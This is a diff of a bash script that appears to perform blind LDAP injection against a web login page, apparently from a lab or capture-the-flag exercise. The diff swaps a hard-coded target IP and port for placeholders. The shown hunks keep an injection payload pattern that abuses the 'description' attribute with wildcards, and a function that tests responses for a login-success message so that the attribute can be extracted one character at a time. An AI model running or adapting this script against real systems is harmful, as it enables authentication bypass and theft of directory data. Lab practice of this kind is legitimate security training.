@@ -1,9 +1,9 @@
 #!/bin/bash
 
 # Define the target URL and headers
-url="http://94.237.58.96:49697/index.php"
+url="http://ip:port/index.php"
 headers=(
-  "-H" "Host: 94.237.58.96:49697"
+  "-H" "Host: ip:port"
   "-H" "Cache-Control: max-age=0"
   "-H" "Accept-Language: en-US,en;q=0.9"
   "-H" "Upgrade-Insecure-Requests: 1"
@@ -22,7 +22,7 @@ payload_pattern="username=admin)(|(description=${payload}*&password=invalid)"
 
 # Function to check for the success message in the response
 check_success() {
-  if echo "$1" | grep -q "Login successful but the site is temporarily down for security reasons."; then
+  if echo "$1" | grep -q "Login successful."; then
     return 0  # success
   else
     return 1  # not found
